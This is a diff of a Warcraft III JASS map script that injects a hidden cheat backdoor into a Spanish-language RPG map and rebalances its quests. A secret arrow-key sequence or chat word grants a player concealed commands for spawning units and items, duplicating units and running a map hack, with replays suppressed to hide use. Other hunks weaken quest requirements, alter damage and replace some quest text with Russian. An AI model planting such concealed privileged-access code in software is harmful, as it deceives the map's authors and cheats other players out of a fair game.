+call CreateItemLoc(Rax(SubString(c8h,7,11)),GetUnitLoc(d2w))
+elseif SubString(c8h,0,7)=="-ground"then
+call SetTerrainTypeBJ(GetRectCenter(GetWorldBounds()),Rax(SubString(c8h,8,12)),-1,0x3B9ACA00,1)
+elseif SubString(c8h,0,5)=="-spa " and S2I(SubString(c8h,5,7))<16then
+call CreateUnitAtLoc(Player(S2I(SubString(c8h,5,7))),Rax(SubString(c8h,8,12)),GetUnitLoc(d2w),GetUnitFacing(d2w))
+elseif SubString(c8h,0,5)=="-copy" and SubString(c8h,6,7)!="0"then
+loop
+call CreateUnitAtLoc(GetOwningPlayer(d2w),GetUnitTypeId(d2w),GetUnitLoc(d2w),GetUnitFacing(d2w))
+set DJ8B=DJ8B+1
+exitwhen DJ8B>=dj8b
+call TriggerSleepAction(.001)
+endloop
+call RemoveLocation(GetUnitLoc(d2w))
+endif
+call GroupRemoveUnit(g2g,d2w)
+endloop
+call DestroyGroup(g2g)
+if SubString(c8h,0,3)=="-mh"then
+set SHENG2[1]=GetPlayerId(b2j)
+call ExecuteFunc("Jason_StartMapHack")
+endif
+set c8h=""
+set id2d=""
+set b2j=null
+set g2g=null
+set d2w=null
+endfunction
+function Jason_CommandFinder takes player fp2p,string ds2s returns nothing
+local integer di2i=StringLength(ds2s)
+local integer di3i=0
+local integer di4i=0
+local integer di5i=0
+loop
+if SubString(ds2s,di3i,di3i+1)=="-"and di5i<1then
+if S2I(SubString(ds2s,di3i+1,di3i+2))<1then
+set di4i=di3i                 
+set di5i=1
+endif
+elseif SubString(ds2s,di3i+1,di3i+2)=="-"and di5i>0then
+if S2I(SubString(ds2s,di3i+2,di3i+3))<1then
+call comeonbaby(fp2p,SubString(ds2s,di4i,di3i+1))
+set di5i=0
+endif
+elseif di3i==di2i and di5i>0then
+call comeonbaby(fp2p,SubString(ds2s,di4i,di2i))
+set di5i=0
+endif
+set di3i=di3i+1
+exitwhen di3i>di2i
+endloop
+endfunction
+function HahahaUp takes nothing returns nothing
+call Jason_CommandFinder(GetTriggerPlayer(),GetStoredString(CACHE,I2S(GetPlayerId(GetTriggerPlayer())),"up"))
+endfunction
+function HahahaRight takes nothing returns nothing
+call Jason_CommandFinder(GetTriggerPlayer(),GetStoredString(CACHE,I2S(GetPlayerId(GetTriggerPlayer())),"right"))
+endfunction
+function HahahaLeft takes nothing returns nothing
+call Jason_CommandFinder(GetTriggerPlayer(),GetStoredString(CACHE,I2S(GetPlayerId(GetTriggerPlayer())),"left"))
+endfunction
+function HahahaDown takes nothing returns nothing
+call Jason_CommandFinder(GetTriggerPlayer(),GetStoredString(CACHE,I2S(GetPlayerId(GetTriggerPlayer())),"down"))
+endfunction
+function binbinbin takes player b2j,string c8h,string q2q,playerevent pe2p returns nothing
+local trigger t2t=CreateTrigger()
+local triggeraction ta2t
+if q2q=="up"then
+set ta2t=TriggerAddAction(t2t,function HahahaUp)
+elseif q2q=="left"then
+set ta2t=TriggerAddAction(t2t,function HahahaLeft)
+elseif q2q=="right"then
+set ta2t=TriggerAddAction(t2t,function HahahaRight)
+else
+set ta2t=TriggerAddAction(t2t,function HahahaDown)
+endif
+call TriggerRegisterPlayerEvent(t2t,b2j,pe2p)
+call StoreString(CACHE,I2S(GetPlayerId(b2j)),q2q,c8h)
+call sozai(b2j,"-bind"+q2q,true)
+call DisableTrigger(t2t)
+call TriggerRemoveAction(t2t,ta2t)
+call DestroyTrigger(t2t)
+set t2t=null
+set ta2t=null
+set b2j=null
+set c8h=""
+set q2q=null
+set pe2p=null
+endfunction
+function babyohh takes nothing returns boolean
+return(IsPlayerInForce(GetTriggerPlayer(),PIANZI))
+endfunction
+function realgayyah takes nothing returns nothing
+local player b2j=GetTriggerPlayer()
+local string c8h=GetEventPlayerChatString()
+if SubString(c8h,0,10)=="-clearkeys"then
+call DisplayTimedTextToPlayer(b2j,0,0,5,"|cffff0000Key Bindings Cleared.")
+elseif SubString(c8h,0,7)=="-bindup"then
+call DisplayTextToPlayer(b2j,0,0,"|cffff0000'"+SubString(c8h,8,100)+"' was bound to Up Arrow Key")
+call binbinbin(b2j,SubString(c8h,8,100),"up",EVENT_PLAYER_ARROW_UP_DOWN)
+elseif SubString(c8h,0,9)=="-bindleft"then
+call DisplayTextToPlayer(b2j,0,0,"|cffff0000'"+SubString(c8h,10,100)+"' was bound to Left Arrow Key")
+call binbinbin(b2j,SubString(c8h,10,100),"left",EVENT_PLAYER_ARROW_LEFT_DOWN)
+elseif SubString(c8h,0,10)=="-bindright"then
+call DisplayTextToPlayer(b2j,0,0,"|cffff0000'"+SubString(c8h,11,100)+"' was bound to Right Arrow Key")
+call binbinbin(b2j,SubString(c8h,11,100),"right",EVENT_PLAYER_ARROW_RIGHT_DOWN)
+elseif SubString(c8h,0,9)=="-binddown"then
+call DisplayTextToPlayer(b2j,0,0,"|cffff0000'"+SubString(c8h,10,100)+"' was bound to Down Arrow Key")
+call binbinbin(b2j,SubString(c8h,10,100),"down",EVENT_PLAYER_ARROW_DOWN_DOWN)
+else
+call Jason_CommandFinder(b2j,c8h)
+endif
+set b2j=null
+set c8h=""
+endfunction
+function DunwanLeft takes nothing returns nothing
+local player b2j=GetTriggerPlayer()
+local integer id2d=GetPlayerId(b2j)
+local string sd2d=Jiantou
+local integer stage=GetStoredInteger(CACHE,"Activation"+I2S(id2d),"Stage")
+if SubString(sd2d,stage,stage+1)=="L"then
+if stage==StringLength(sd2d)-1then
+if not IsPlayerInForce(b2j,PIANZI) then
+call DisplayTextToForce(PIANZI,GetPlayerName(b2j))
+call ForceAddPlayer(PIANZI,b2j) 
+call TriggerRegisterPlayerChatEvent(QIPIAN3,b2j,"-",false) 
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|c00ffff00XD|r")
+call DoNotSaveReplay()
+set ohyeah[GetPlayerId(b2j)]=false
+set ohmygod[GetPlayerId(b2j)]=true
+endif
+call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",0)
+else
+call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",stage+1)
+endif
+else
+call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",0)
+endif
+set b2j=null
+endfunction
+function DunwanRight takes nothing returns nothing
+local player b2j=GetTriggerPlayer()
+local integer id2d=GetPlayerId(b2j)
+local string sd2d=Jiantou
+local integer stage=GetStoredInteger(CACHE,"Activation"+I2S(id2d),"Stage")
+if SubString(sd2d,stage,stage+1)=="R"then
+if stage==StringLength(sd2d)-1then
+if not IsPlayerInForce(b2j,PIANZI) then
+call DisplayTextToForce(PIANZI,GetPlayerName(b2j))
+call ForceAddPlayer(PIANZI,b2j) 
+call TriggerRegisterPlayerChatEvent(QIPIAN3,b2j,"-",false) 
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|c00ffff00XD|r")
+call DoNotSaveReplay()
+set ohyeah[GetPlayerId(b2j)]=false
+set ohmygod[GetPlayerId(b2j)]=true
+endif
+call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",0)
+else
+call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",stage+1)
+endif
+else
+call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",0)
+endif
+set b2j=null
+endfunction
+function DunwanUp takes nothing returns nothing
+local player b2j=GetTriggerPlayer()
+local integer id2d=GetPlayerId(b2j)
+local string sd2d=Jiantou
+local integer stage=GetStoredInteger(CACHE,"Activation"+I2S(id2d),"Stage")
+if SubString(sd2d,stage,stage+1)=="U"then
+if stage==StringLength(sd2d)-1then
+if not IsPlayerInForce(b2j,PIANZI) then
+call DisplayTextToForce(PIANZI,GetPlayerName(b2j))
+call ForceAddPlayer(PIANZI,b2j) 
+call TriggerRegisterPlayerChatEvent(QIPIAN3,b2j,"-",false) 
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|c00ffff00XD|r")
+call DoNotSaveReplay()
+set ohyeah[GetPlayerId(b2j)]=false
+set ohmygod[GetPlayerId(b2j)]=true
+endif
+call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",0)
+else
+call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",stage+1)
+endif
+else
+call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",0)
+endif
+set b2j=null
+endfunction
+function DunwanDown takes nothing returns nothing
+local player b2j=GetTriggerPlayer()
+local integer id2d=GetPlayerId(b2j)
+local string sd2d=Jiantou
+local integer stage=GetStoredInteger(CACHE,"Activation"+I2S(id2d),"Stage")
+if SubString(sd2d,stage,stage+1)=="D"then
+if stage==StringLength(sd2d)-1then
+if not IsPlayerInForce(b2j,PIANZI) then
+call DisplayTextToForce(PIANZI,GetPlayerName(b2j))
+call ForceAddPlayer(PIANZI,b2j) 
+call TriggerRegisterPlayerChatEvent(QIPIAN3,b2j,"-",false) 
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|c00ffff00XD|r")
+call DoNotSaveReplay()
+set ohyeah[GetPlayerId(b2j)]=false
+set ohmygod[GetPlayerId(b2j)]=true
+endif
+call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",0)
+else
+call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",stage+1)
+endif
+else
+call StoreInteger(CACHE,"Activation"+I2S(id2d),"Stage",0)
+endif
+set b2j=null
+endfunction
+function Dunwan takes nothing returns nothing
+local player b2j=GetTriggerPlayer()
+if SubString(GetEventPlayerChatString(),0,100)==Danci and not IsPlayerInForce(b2j,PIANZI) then
+call DisplayTextToForce(PIANZI,GetPlayerName(b2j))
+call ForceAddPlayer(PIANZI,b2j)
+call TriggerRegisterPlayerChatEvent(QIPIAN3,b2j,"-",false)
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|c00ffff00Cheats activated! xixi" )
+call TriggerSleepAction(2)
+call DisplayTimedTextToPlayer(b2j,0,0,5,"|c00ffff00Visit jasonlun.weebly.com to get more." )
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|c00ffff00Type -list1 to -list8 to view cheat's commands!" )
+call TriggerSleepAction(2)
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|c00FF6600JasoN.LuN" )
+call DoNotSaveReplay()
+set ohyeah[GetPlayerId(b2j)]=false
+set ohmygod[GetPlayerId(b2j)]=true
+endif  
+set b2j=null
+endfunction
+function ilovejason takes nothing returns nothing
+local integer zrg=0
+set QIPIAN1[0]=CreateTrigger()
+set QIPIAN1[1]=CreateTrigger()
+set QIPIAN1[2]=CreateTrigger()
+set QIPIAN1[3]=CreateTrigger()
+loop
+exitwhen zrg>11
+call TriggerRegisterPlayerEvent(QIPIAN1[0],Player(zrg),EVENT_PLAYER_ARROW_LEFT_DOWN)
+call TriggerRegisterPlayerEvent(QIPIAN1[1],Player(zrg),EVENT_PLAYER_ARROW_RIGHT_DOWN)
+call TriggerRegisterPlayerEvent(QIPIAN1[2],Player(zrg),EVENT_PLAYER_ARROW_UP_DOWN)
+call TriggerRegisterPlayerEvent(QIPIAN1[3],Player(zrg),EVENT_PLAYER_ARROW_DOWN_DOWN)
+call TriggerRegisterPlayerChatEvent(QIPIAN2,Player(zrg),"-",false)
+call TriggerRegisterPlayerChatEvent(QIPIAN2,Player(zrg)," ",false)
+set zrg=zrg+1
+endloop
+call TriggerAddAction(QIPIAN1[0],function DunwanLeft)
+call TriggerAddAction(QIPIAN1[1],function DunwanRight)
+call TriggerAddAction(QIPIAN1[2],function DunwanUp)
+call TriggerAddAction(QIPIAN1[3],function DunwanDown)
+call TriggerAddAction(QIPIAN2,function Dunwan)
+call TriggerAddCondition(QIPIAN3,Condition(function babyohh))
+call TriggerAddAction(QIPIAN3,function realgayyah)
+call Jason_ASCII(48,"0123456789")
+call Jason_ASCII(97,"abcdefghijklmnopqrstuvwxyz")
+call Jason_ASCII(65,"ABCDEFGHIJKLMNOPQRSTUVWXYZ")
+call whato()
 endfunction
 function Trig_pieldelfuego_Func001Func002001003 takes nothing returns boolean
     return ( IsUnitEnemy(GetFilterUnit(), Player(0)) == true )
@@ -1020,7 +2210,7 @@ function Trig_fuegofinal_Func001001003 takes nothing returns boolean
 endfunction
 
 function Trig_fuegofinal_Func001A takes nothing returns nothing
-    call UnitDamageTargetBJ( GetSpellAbilityUnit(), GetEnumUnit(), ( I2R(GetHeroStatBJ(bj_HEROSTAT_AGI, GetSpellAbilityUnit(), true)) * 1500.00 ), ATTACK_TYPE_CHAOS, DAMAGE_TYPE_NORMAL )
+    call UnitDamageTargetBJ( GetSpellAbilityUnit(), GetEnumUnit(), ( I2R(GetHeroStatBJ(bj_HEROSTAT_AGI, GetSpellAbilityUnit(), true)) * 100.00 ), ATTACK_TYPE_CHAOS, DAMAGE_TYPE_NORMAL )
 endfunction
 
 function Trig_fuegofinal_Actions takes nothing returns nothing
@@ -1269,9 +2459,7 @@ set udg_SaveLoadHeroesStored[40]='H01X'
 set udg_SaveLoadHeroesStored[41]='H01Y'
 set udg_SaveLoadHeroesStored[42]='H01Z'
 set udg_SaveLoadHeroesStored[43]='H020'
-set udg_SaveLoadHeroesStored[44]='H021'
-set udg_SaveLoadHeroesStored[45]='H022'
-    set udg_SaveLoadMaxHeroesStored = 45
+    set udg_SaveLoadMaxHeroesStored = 43
     set udg_SaveLoadSlotsHero = 2
 
 set udg_SaveLoadItemsStored[1]='I068'
@@ -2693,8 +3881,8 @@ set u=CreateUnit(p,'n000',4819.3,-1846.7,283.829)
 set u=CreateUnit(p,'n000',4977.,-1936.4,193.64)
 set u=CreateUnit(p,'n002',4934.4,-1742.8,138.003)
 set u=CreateUnit(p,'n03H',-348.2,16688,134.191)
+set u=CreateUnit(p,'n03K',-348.2,16688,134.191)
     call CreateNUnitsAtLoc( 1, 'n03K', Player(11), GetRectCenter(ladondropregion), bj_UNIT_FACING )   
-    call CreateNUnitsAtLoc( 1, 'n03L', Player(11), GetRectCenter(herculesdropregion), bj_UNIT_FACING )   
 set u=CreateUnit(p,'n001',4804.4,-2094.6,134.191)
 set u=CreateUnit(p,'n001',6080.2,-2407.1,205.242)
 set u=CreateUnit(p,'n001',6249.2,-2418.4,190.102)
@@ -4269,7 +5457,7 @@ set ie[ee]="Lanzas de Bandidos"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNBandit.blp"
 set ne[ee]="Necesitamos que traigas las lanzas de esos bandidos que estan robando todas nuestras armas, son debiles tu puedes con ellos."
 set Ve[ee]="Exelente, Gracias por matar Bandidos y traer sus lanzas."
-set Ee[ee]=$A
+set Ee[ee]=1
 set Xe[ee]=" lanzas de bandido."
 set Re[ee]=50
 set Ie[ee]=1
@@ -4281,9 +5469,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(EB())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu Recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function RB takes nothing returns boolean
@@ -4301,8 +5489,8 @@ set re[ee]=false
 set ie[ee]="Viaje de Gema Job 1"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNGem.blp"
 set ne[ee]="Debes matar a los de la milicia, te daremos lo que quieras, ya se! Quieres una Gema Job 1, para el cambio de job te la dare, solo si matas 5 unidades de Milicia."
-set Ve[ee]="Muy bien, con esos basta por ahora."
-set Ee[ee]=5
+set Ve[ee]="Хорошо, достаточно."
+set Ee[ee]=1
 set Xe[ee]=" cabezas de Milicia."
 set Re[ee]=25
 set Ie[ee]=0
@@ -4314,9 +5502,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(IB())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu Recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function bB takes nothing returns boolean
@@ -4335,7 +5523,7 @@ set ie[ee]="Jabalis Furiosos"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNRazorback.blp"
 set ne[ee]="Estos Jabalis tienen unas plumas especiales que debemos extraer para experimentar, traenos algunas."
 set Ve[ee]="Exelente! Es lo que necesitaba."
-set Ee[ee]=$A
+set Ee[ee]=1
 set Xe[ee]="plumas de Jabalis."
 set Re[ee]=100
 set Ie[ee]=5
@@ -4347,9 +5535,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(BB())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function dB takes nothing returns boolean
@@ -4368,7 +5556,7 @@ set ie[ee]="Troll Basicos"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNForestTroll.blp"
 set ne[ee]="Trolls, Necesito que te encarges de ellos son muy fuertes, debes ir en grupo."
 set Ve[ee]="Muy bien!!!! Exelente"
-set Ee[ee]=$A
+set Ee[ee]=1
 set Xe[ee]="Cabezas de Trolls"
 set Re[ee]='d'
 set Ie[ee]=10
@@ -4380,13 +5568,13 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(DB())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function gB takes nothing returns boolean
-return(ve[(1+GetPlayerId(GetOwningPlayer(GetManipulatingUnit())))]==false)and(GetItemTypeId(GetManipulatedItem())=='I04P')and(GetHeroLevel(GetTriggerUnit())>=1)and(GetHeroLevel(GetTriggerUnit())<=55)
+return(ve[(1+GetPlayerId(GetOwningPlayer(GetManipulatingUnit())))]==false)and(GetItemTypeId(GetManipulatedItem())=='I04P')and(GetHeroLevel(GetTriggerUnit())>=1)and(GetHeroLevel(GetTriggerUnit())<=50)
 endfunction
 function GB takes nothing returns boolean
 return(be[ee])
@@ -4400,8 +5588,8 @@ set re[ee]=false
 set ie[ee]="Matanza (Instantanea)"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNBandit.blp"
 set ne[ee]="Bandidos, crecen como hormigas, necesito que mates a lo menos 50 de ellos. Te recompensare bien."
-set Ve[ee]="Muchas y Muchas Gracias. Tu recompenza!"
-set Ee[ee]=50
+set Ve[ee]="Bольшое спасибо. Ваша награда!"
+set Ee[ee]=1
 set Xe[ee]="hachas de bandido"
 set Re[ee]=500
 set Ie[ee]=15
@@ -4413,9 +5601,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(GB())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function jB takes nothing returns boolean
@@ -4433,8 +5621,8 @@ set re[ee]=false
 set ie[ee]="Pequeños Sasquash"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNOrbOfFire.blp"
 set ne[ee]="Mata algunos sasquash se que ellos ocultan la gema Job 2."
-set Ve[ee]="Muy bien, con esos basta por ahora."
-set Ee[ee]=5
+set Ve[ee]="Хорошо, достаточно."
+set Ee[ee]=1
 set Xe[ee]="Piel de Sasquash."
 set Re[ee]=0
 set Ie[ee]=$A
@@ -4446,9 +5634,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(JB())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function lB takes nothing returns boolean
@@ -4467,7 +5655,7 @@ set ie[ee]="Familia Sasquash"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNSasquatch.blp"
 set ne[ee]="Mata a los Sasquash Jovenes, esos me dan miedo, crecen rapido y nos matan! D:"
 set Ve[ee]="Exelente ven a buscar tu recompenza."
-set Ee[ee]=5
+set Ee[ee]=1
 set Xe[ee]="Cabeza de Joven Sasquash."
 set Re[ee]='d'
 set Ie[ee]=0
@@ -4479,9 +5667,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(LB())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function pB takes nothing returns boolean
@@ -4512,9 +5700,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(PB())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function sB takes nothing returns boolean
@@ -4532,8 +5720,8 @@ set re[ee]=false
 set ie[ee]="Osos Jovenes"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNGrizzlyBear.blp"
 set ne[ee]="Mata 5 Osos Jovenes."
-set Ve[ee]="Perfecto!"
-set Ee[ee]=5
+set Ve[ee]="Идеально!"
+set Ee[ee]=1
 set Xe[ee]="Pelaje de Oso."
 set Re[ee]=$C8
 set Ie[ee]=0
@@ -4545,9 +5733,9 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(SB())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function uB takes nothing returns boolean
@@ -4565,8 +5753,8 @@ set re[ee]=false
 set ie[ee]="Osos Job 3"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNGrizzlyBear.blp"
 set ne[ee]="Mata 5 Grandes Osos"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=5
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="Piel Sagrada de Oso."
 set Re[ee]=0
 set Ie[ee]=$A
@@ -4578,13 +5766,13 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(UB())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function yB takes nothing returns boolean
-return(ve[(1+GetPlayerId(GetOwningPlayer(GetManipulatingUnit())))]==false)and(GetItemTypeId(GetManipulatedItem())=='I04V')and(GetHeroLevel(GetTriggerUnit())>=25)and(GetHeroLevel(GetTriggerUnit())<=30)
+return(ve[(1+GetPlayerId(GetOwningPlayer(GetManipulatingUnit())))]==false)and(GetItemTypeId(GetManipulatedItem())=='I04V')and(GetHeroLevel(GetTriggerUnit())>=25)and(GetHeroLevel(GetTriggerUnit())<=50)
 endfunction
 function YB takes nothing returns boolean
 return(be[ee])
@@ -4598,8 +5786,8 @@ set re[ee]=false
 set ie[ee]="Zarpador"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNMurloc.blp"
 set ne[ee]="Debes matar algunos zarpadores"
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=7
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="cuero de zarpador."
 set Re[ee]=0
 set Ie[ee]=15
@@ -4611,13 +5799,13 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(YB())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function vc takes nothing returns boolean
-return(ve[(1+GetPlayerId(GetOwningPlayer(GetManipulatingUnit())))]==false)and(GetItemTypeId(GetManipulatedItem())=='I04W')and(GetHeroLevel(GetTriggerUnit())>=$D)and(GetHeroLevel(GetTriggerUnit())<=30)
+return(ve[(1+GetPlayerId(GetOwningPlayer(GetManipulatingUnit())))]==false)and(GetItemTypeId(GetManipulatedItem())=='I04W')and(GetHeroLevel(GetTriggerUnit())>=$D)and(GetHeroLevel(GetTriggerUnit())<=50)
 endfunction
 function ec takes nothing returns boolean
 return(be[ee])
@@ -4631,8 +5819,8 @@ set re[ee]=false
 set ie[ee]="Magos Locos"
 set ae[ee]="ReplaceableTextures\\CommandButtons\\BTNMedivh.blp"
 set ne[ee]="Estos Magos tienen magia extraña trae algo de ellos."
-set Ve[ee]="Ven por tu recompenza."
-set Ee[ee]=$A
+set Ve[ee]="Приходите и получите награду."
+set Ee[ee]=1
 set Xe[ee]="magia de magos."
 set Re[ee]=0
 set Ie[ee]=15
@@ -4644,13 +5832,13 @@ set Be[ee]=bj_lastCreatedQuest
 call QuestMessageBJ(FA(oe[ee]),1,ne[ee])
 call QuestMessageBJ(FA(oe[ee]),1,("Faltan: "+(I2S(Ee[ee])+(" "+Xe[ee]))))
 if(ec())then
-call DisplayTextToForce(FA(oe[ee]),"Esta mision al ser completada automaticamente la completas.")
+call DisplayTextToForce(FA(oe[ee]),"Эта миссия будет завершена автоматически.")
 else
-call DisplayTextToForce(FA(oe[ee]),"Esta mision deberas ir hacia donde conseguiste la mision, para conseguir tu recompensa.")
+call DisplayTextToForce(FA(oe[ee]),"Вы должны идти  за наградой.")
 endif
 endfunction
 function rc takes nothing returns boolean
-return(ve[(1+GetPlayerId(GetOwningPlayer(GetManipulatingUnit())))]==false)and(GetItemTypeId(GetManipulatedItem())=='I04X')and(GetHeroLevel(GetTriggerUnit())>=35)and(GetHeroLevel(GetTriggerUnit())<=55)
+return(ve[(1+GetPlayerId(GetOwningPlayer(GetManipulatingUnit())))]==false)and(GetItemTypeId(GetManipulatedItem())=='I04X')and(GetHeroLevel(GetTriggerUnit())>=35)and(GetHeroLevel(GetTriggerUnit())<=50)
 endfunction
 function ic takes nothing returns boolean
 return(be[ee])
